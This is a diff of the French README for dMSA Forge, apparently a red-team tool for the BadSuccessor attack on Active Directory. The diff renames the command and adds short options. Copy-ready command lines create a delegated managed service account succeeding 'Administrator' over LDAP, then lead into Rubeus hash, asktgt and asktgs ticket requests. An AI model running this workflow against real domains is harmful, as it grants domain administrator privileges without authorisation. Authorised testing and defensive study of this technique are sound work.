@@ -1,12 +1,12 @@
 # dMSA Forge
 
-[![Release](https://img.shields.io/github/v/release/RedteamNotes/dmsa-forge?label=release)](https://github.com/RedteamNotes/dmsa-forge/releases/tag/v0.5.14)
+[![Release](https://img.shields.io/github/v/release/RedteamNotes/dmsa-forge?label=release)](https://github.com/RedteamNotes/dmsa-forge/releases/tag/v0.5.15)
 [![Tests](https://github.com/RedteamNotes/dmsa-forge/actions/workflows/test.yml/badge.svg)](https://github.com/RedteamNotes/dmsa-forge/actions/workflows/test.yml)
 [![License](https://img.shields.io/badge/license-Impacket%20Apache--1.1-blue)](https://github.com/RedteamNotes/dmsa-forge/blob/main/LICENSE)
 
 **Langue :** [English](../README.md) | [简体中文](README.zh-CN.md) | Français
 
-Version actuelle : `v0.5.14`
+Version actuelle : `v0.5.15`
 
 Forge [dMSA](https://learn.microsoft.com/fr-fr/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview) pour les workflows LDAP [BadSuccessor](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory) autorisés : assess, add, verify et delete.
 
@@ -52,36 +52,36 @@ python -m pip install ./dmsa-forge
 Après installation, exécutez :
 
 ```bash
-dmsa-forge -h
+dmsaforge -h
 ```
 
 Quand une nouvelle version est disponible, mettez à jour l'environnement actif :
 
 ```bash
-dmsa-forge update
+dmsaforge update
 ```
 
-`update` compare d'abord la version installée avec la version cible. Si elles correspondent, pip est ignoré ; si elles diffèrent, la mise à jour est lancée, que la version cible soit supérieure ou inférieure. Utilisez `dmsa-forge update --force` seulement pour exécuter pip sans contrôle de version.
+`update` compare d'abord la version installée avec la version cible. Si elles correspondent, pip est ignoré ; si elles diffèrent, la mise à jour est lancée, que la version cible soit supérieure ou inférieure. Utilisez `dmsaforge update --force` seulement pour exécuter pip sans contrôle de version.
 
 Entrées d'aide utiles :
 
 ```bash
-dmsa-forge add -h
-dmsa-forge update --dry-run
+dmsaforge add -h
+dmsaforge update --dry-run
 ```
 
-Pour une utilisation depuis une copie source sans installation, exécutez `./dmsa-forge.py`.
-Les exemples ci-dessous utilisent des commandes nommées par tâche et les options modernes `--long-option`.
+Pour une utilisation depuis une copie source sans installation, exécutez `./dmsaforge.py`.
+Les exemples ci-dessous utilisent des commandes nommées par tâche et les raccourcis courants. Les options longues restent disponibles pour les scripts qui privilégient les noms explicites.
 
 ## Démarrage Rapide
 
-Prévisualisez un add avec le profil safe. Les commandes de ce README sont volontairement présentées sur une seule ligne, prêtes à copier ; si vous utilisez un wrapper local comme `proxychains -f chain1080.conf -q`, placez-le avant `dmsa-forge`.
+Prévisualisez un add avec le profil safe. Les commandes de ce README sont volontairement présentées sur une seule ligne, prêtes à copier ; si vous utilisez un wrapper local comme `proxychains -f chain1080.conf -q`, placez-le avant `dmsaforge`.
 
 ```bash
-dmsa-forge plan add redteamnotes.com/operator:'PASSWORD' --profile safe --target-ou 'OU=Dev,DC=redteamnotes,DC=com' --dmsa-name redpen --target-account 'Administrator' --principals-allowed '<SID_OR_NAME>'
+dmsaforge plan add redteamnotes.com/operator:'PASSWORD' --profile safe -o 'OU=Dev,DC=redteamnotes,DC=com' -d redpen -t 'Administrator' --principals-allowed '<SID_OR_NAME>'
 ```
 
-Par défaut, `DOMAIN/user` infère `--scope-domain`, `--scope-base-dn` et `--base-dn` ; LDAP/389 est la méthode et le port par défaut ; `--dns-hostname` est inféré depuis `--dmsa-name` et le domaine du compte. Pour `add`, choisissez explicitement le compte à succéder avec `--target-account` et le lecteur du mot de passe géré avec `--principals-allowed`.
+Par défaut, `DOMAIN/user` infère `--scope-domain`, `--scope-base-dn` et `--base-dn` ; LDAP/389 est la méthode et le port par défaut ; `--dns-hostname` est inféré depuis `-d/--dmsa-name` et le domaine du compte. Pour `add`, choisissez explicitement le compte predecessor avec `-t/--target-account` et le lecteur du mot de passe géré avec `--principals-allowed`.
 
 Les modèles utilisent `redpen` comme nom dMSA suggéré et `Administrator` comme exemple courant de predecessor account. Remplacez l'une ou l'autre valeur lorsque la chaîne autorisée cible un autre objet.
 
@@ -92,52 +92,52 @@ Ces modèles gardent chaque commande sur une seule ligne pour le copier-coller, 
 Évaluer les droits OU :
 
 ```bash
-dmsa-forge assess redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com
+dmsaforge assess redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com
 ```
 
 Vérification avant ajout :
 
 ```bash
-dmsa-forge verify redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com --target-ou 'OU=Dev,DC=redteamnotes,DC=com' --dmsa-name redpen
+dmsaforge verify redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com -o 'OU=Dev,DC=redteamnotes,DC=com' -d redpen
 ```
 
 Plan d'ajout :
 
 ```bash
-dmsa-forge plan add redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com --target-ou 'OU=Dev,DC=redteamnotes,DC=com' --dmsa-name redpen --target-account 'Administrator' --principals-allowed '<SID_OR_NAME>'
+dmsaforge plan add redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com -o 'OU=Dev,DC=redteamnotes,DC=com' -d redpen -t 'Administrator' --principals-allowed '<SID_OR_NAME>'
 ```
 
 Ajouter :
 
 ```bash
-dmsa-forge add redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com --target-ou 'OU=Dev,DC=redteamnotes,DC=com' --dmsa-name redpen --target-account 'Administrator' --principals-allowed '<SID_OR_NAME>'
+dmsaforge add redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com -o 'OU=Dev,DC=redteamnotes,DC=com' -d redpen -t 'Administrator' --principals-allowed '<SID_OR_NAME>'
 ```
 
 Vérification après ajout :
 
 ```bash
-dmsa-forge verify redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com --target-ou 'OU=Dev,DC=redteamnotes,DC=com' --dmsa-name redpen
+dmsaforge verify redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com -o 'OU=Dev,DC=redteamnotes,DC=com' -d redpen
 ```
 
 Supprimer après usage :
 
 ```bash
-dmsa-forge delete redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com --target-ou 'OU=Dev,DC=redteamnotes,DC=com' --dmsa-name redpen --yes
+dmsaforge delete redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com -o 'OU=Dev,DC=redteamnotes,DC=com' -d redpen --yes
 ```
 
 Après un `add` ou `verify` validé, `Next steps` affiche directement les commandes Kerberos externes concrètes. Le flux généré commence par `Rubeus hash`, utilise ensuite la valeur AES256 affichée pour `asktgt`, puis lance la requête dMSA `asktgs`.
 
-La résolution du compte cible repose sur une recherche LDAP. `--target-account` écrit `msDS-ManagedAccountPrecededByLink`; `--principals-allowed` écrit le SID utilisé dans `msDS-GroupMSAMembership`. Les next steps générés par assess peuvent remplir le SID principal découvert, mais le compte cible reste un choix explicite de l'opérateur.
+La résolution du compte cible repose sur une recherche LDAP. `-t/--target-account` écrit `msDS-ManagedAccountPrecededByLink`; `--principals-allowed` écrit le SID utilisé dans `msDS-GroupMSAMembership`. Les next steps générés par assess peuvent remplir le SID principal découvert, mais le compte cible reste un choix explicite de l'opérateur.
 
 Contrôles de sécurité :
 
-- Utilisez `dmsa-forge plan ACTION ...`, `--dry-run` ou `--plan` pour valider les options et afficher les opérations LDAP prévues sans ouvrir de connexion LDAP.
+- Utilisez `dmsaforge plan ACTION ...`, `--dry-run` ou `--plan` pour valider les options et afficher les opérations LDAP prévues sans ouvrir de connexion LDAP.
 - Utilisez `--profile safe` pour un dry-run masqué, `--profile report` pour des rapports JSON, ou `--profile ci` pour une sortie quiet JSON/no-banner.
 - `DOMAIN/user` infère `--scope-domain`, `--scope-base-dn` et `--base-dn` ; un `--scope-base-dn` valide peut aussi fournir le base DN par défaut. Remplacez-les explicitement lorsque le périmètre autorisé diffère.
-- Quand `--method` et `--port` sont omis, LDAP/389 est tenté en premier. Si la connexion échoue, dMSA Forge peut essayer LDAPS/636 et consigne les candidats tentés dans la sortie terminale et les rapports JSON/texte. Un `--port 636` seul infère LDAPS ; définir à la fois `--method` et `--port` exige une paire exacte.
-- `--dns-hostname` vaut par défaut `<dmsa-name>.<account-domain>` lorsque `--dmsa-name` est défini.
+- Quand `-m/--method` et `-p/--port` sont omis, LDAP/389 est tenté en premier. Si la connexion échoue, dMSA Forge peut essayer LDAPS/636 et consigne les candidats tentés dans la sortie terminale et les rapports JSON/texte. Un `-p 636` seul infère LDAPS ; définir à la fois method et port exige une paire exacte.
+- `--dns-hostname` vaut par défaut `<dmsa-name>.<account-domain>` lorsque `-d/--dmsa-name` est défini.
 - Utilisez `--dc-host` pour un DC précis, et `--dc-ip` uniquement lorsque DNS ou le routage nécessite une adresse IP explicite. La résolution automatique de l'IP du DC ne sonde jamais le réseau ; les résultats multicast, loopback, link-local, unspecified, broadcast et reserved sont rejetés afin qu'un placeholder DNS de proxy comme `224.0.0.1` ne devienne pas une valeur Kerberos `/dc:`.
-- Pour `assess`, `--target-ou` réduit la base d'évaluation OU. La vérification préalable du DC est best-effort ; en cas d'échec, l'évaluation OU continue et consigne un warning.
+- Pour `assess`, `-o/--ou` réduit la base d'évaluation OU. La vérification préalable du DC est best-effort ; en cas d'échec, l'évaluation OU continue et consigne un warning.
 - La résolution du compte cible et de `--principals-allowed` préfère les correspondances exactes `sAMAccountName`, UPN ou CN. Les résultats LDAP ambigus échouent proprement avec une indication de fournir un DN complet ou un SID.
 - `delete` exige `--yes`. L'ancien workflow `modify` a été supprimé ; utilisez `delete`, `add` et `verify`.
 - La sortie locale est masquée par défaut. `--no-redact` exige `--debug`.
